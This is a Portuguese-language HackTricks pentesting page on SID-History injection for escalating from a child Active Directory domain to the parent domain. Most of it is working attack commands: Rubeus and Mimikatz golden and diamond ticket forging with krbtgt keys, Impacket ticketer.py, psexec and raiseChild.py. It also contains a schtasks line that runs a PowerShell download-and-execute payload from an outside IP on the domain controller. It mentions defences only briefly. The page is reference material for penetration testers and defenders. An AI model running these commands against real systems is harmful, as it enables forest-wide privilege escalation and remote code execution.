# Injeção de SID-History

{{#include ../../banners/hacktricks-training.md}}

## Ataque de Injeção de SID History

O foco do **Ataque de Injeção de SID History** é auxiliar **na migração de usuários entre domínios** enquanto garante o acesso contínuo a recursos do domínio anterior. Isso é realizado **incorporando o Identificador de Segurança (SID) anterior do usuário no SID History** de sua nova conta. Notavelmente, esse processo pode ser manipulado para conceder acesso não autorizado ao adicionar o SID de um grupo de alto privilégio (como Administradores de Empresa ou Administradores de Domínio) do domínio pai ao SID History. Essa exploração confere acesso a todos os recursos dentro do domínio pai.

Existem dois métodos para executar esse ataque: através da criação de um **Golden Ticket** ou um **Diamond Ticket**.

Para identificar o SID do grupo **"Administradores de Empresa"**, é necessário primeiro localizar o SID do domínio raiz. Após a identificação, o SID do grupo Administradores de Empresa pode ser construído adicionando `-519` ao SID do domínio raiz. Por exemplo, se o SID do domínio raiz for `S-1-5-21-280534878-1496970234-700767426`, o SID resultante para o grupo "Administradores de Empresa" seria `S-1-5-21-280534878-1496970234-700767426-519`.

Você também pode usar os grupos **Administradores de Domínio**, que terminam em **512**.

Outra maneira de encontrar o SID de um grupo do outro domínio (por exemplo, "Administradores de Domínio") é com:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Note que é possível desativar o histórico de SID em um relacionamento de confiança, o que fará com que este ataque falhe.

De acordo com a [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
- **Desativando o SIDHistory em florestas de confiança** usando a ferramenta netdom (`netdom trust /domain: /EnableSIDHistory:no no controlador de domínio`)
- **Aplicando Quarentena de Filtro de SID a confianças externas** usando a ferramenta netdom (`netdom trust /domain: /quarantine:yes no controlador de domínio`)
- **Aplicar Filtro de SID a confianças de domínio dentro de uma única floresta** não é recomendado, pois é uma configuração não suportada e pode causar mudanças drásticas. Se um domínio dentro de uma floresta não for confiável, ele não deve ser membro da floresta. Nessa situação, é necessário primeiro separar os domínios confiáveis e não confiáveis em florestas separadas onde o Filtro de SID pode ser aplicado a uma confiança interflorestal.

Verifique este post para mais informações sobre como contornar isso: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Na última vez que tentei isso, precisei adicionar o arg **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) com KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Para mais informações sobre golden tickets, consulte:

{{#ref}}
golden-ticket.md
{{#endref}}


Para mais informações sobre diamond tickets, consulte:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Escalar para DA de root ou administrador da empresa usando o hash KRBTGT do domínio comprometido:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Com as permissões adquiridas do ataque, você pode executar, por exemplo, um ataque DCSync no novo domínio:

{{#ref}}
dcsync.md
{{#endref}}

### Do linux

#### Manual com [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automático usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Este é um script do Impacket que **automatiza a elevação de child para parent domain**. O script precisa de:

- Controlador de domínio de destino
- Credenciais para um usuário administrador no child domain

O fluxo é:

- Obtém o SID para o grupo Enterprise Admins do parent domain
- Recupera o hash da conta KRBTGT no child domain
- Cria um Golden Ticket
- Faz login no parent domain
- Recupera credenciais para a conta Administrator no parent domain
- Se o switch `target-exec` for especificado, autentica-se no Domain Controller do parent domain via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referências

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
